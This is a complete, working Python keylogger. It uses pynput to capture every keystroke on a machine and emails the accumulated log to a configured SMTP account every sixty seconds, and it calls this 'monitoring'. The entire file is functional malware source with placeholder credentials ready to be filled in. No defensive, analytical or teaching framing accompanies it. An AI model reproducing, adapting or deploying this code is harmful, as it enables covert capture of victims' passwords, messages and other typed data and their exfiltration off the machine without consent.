#!/usr/bin/env python

import smtplib
import threading
from pynput import keyboard

class KeyCapture:

    def __init__(self, interval, user_email, user_password, smtp_server, smtp_port):
        """
        Initialize the KeyCapture class.

        Parameters:
        interval (int): Interval in seconds for sending email reports.
        user_email (str): Email address for sending the logs.
        user_password (str): Password for the email account.
        smtp_server (str): SMTP server address for sending emails.
        smtp_port (int): SMTP port for secure email transmission.
        """
        self.interval = interval  # Interval in seconds (e.g., 60 for 1 minute)
        self.log_data = "Monitoring started..."  # Initial log message
        self.user_email = user_email  # Email address to send logs to
        self.user_password = user_password  # Password for the email account
        self.smtp_server = smtp_server  # SMTP server for sending emails
        self.smtp_port = smtp_port  # SMTP port number

    def append_to_log(self, text):
        """
        Append text to the log data.

        Parameters:
        text (str): The text to append to the log.
        """
        self.log_data += text

    def on_key_event(self, key):
        """
        Handle key press events and append the keystroke to the log.

        Parameters:
        key (Key): The key that was pressed.
        """
        try:
            key_pressed = str(key.char)  # Convert key to string
        except AttributeError:
            if key == key.space:
                key_pressed = " "  # Handle space key
            elif key == key.esc:
                print("Exiting...")
                return False  # Stop the listener on ESC key
            else:
                key_pressed = " " + str(key) + " "  # Handle other special keys

        self.append_to_log(key_pressed)  # Add keystroke to log

    def send_report(self, email, password, content):
        """
        Send the log data via email.

        Parameters:
        email (str): Email address for sending the log.
        password (str): Password for the email account.
        content (str): The log content to send.
        """
        with smtplib.SMTP(self.smtp_server, self.smtp_port) as smtp:
            smtp.starttls()  # Start TLS for secure communication
            smtp.login(email, password)  # Log in to the email account
            smtp.sendmail(email, email, content)  # Send the email

    def generate_and_send_report(self):
        """
        Generate and send the log report, then reset the log data and set up the next report.
        """
        self.send_report(self.user_email, self.user_password, "\n\n" + self.log_data)  # Send log data
        self.log_data = ""  # Clear log data after sending
        timer = threading.Timer(self.interval, self.generate_and_send_report)  # Set up timer for the next report
        timer.start()  # Start the timer

    def start_monitoring(self):
        """
        Start listening for key presses and periodically send reports.
        """
        with keyboard.Listener(on_press=self.on_key_event) as listener:
            self.generate_and_send_report()  # Start sending reports
            listener.join()  # Keep listening for key presses

if __name__ == "__main__":
    # Set parameters for the KeyCapture instance
    # Update the following fields with actual values:
    # - `user_email`: Your email address for receiving logs
    # - `user_password`: Password for the email account
    # - `smtp_server`: SMTP server address (e.g., 'smtp.office365.com')
    # - `smtp_port`: SMTP port number (e.g., 587 for TLS)
    key_capture = KeyCapture(
        interval=60,  # Interval for sending logs (60 seconds = 1 minute)
        user_email='your-email@example.com',  # Replace with your email
        user_password='your-password',  # Replace with your email account password
        smtp_server='smtp.example.com',  # Replace with SMTP server address
        smtp_port=587  # Replace with SMTP port number (587 for TLS)
    )
    key_capture.start_monitoring()  # Begin monitoring and sending reports
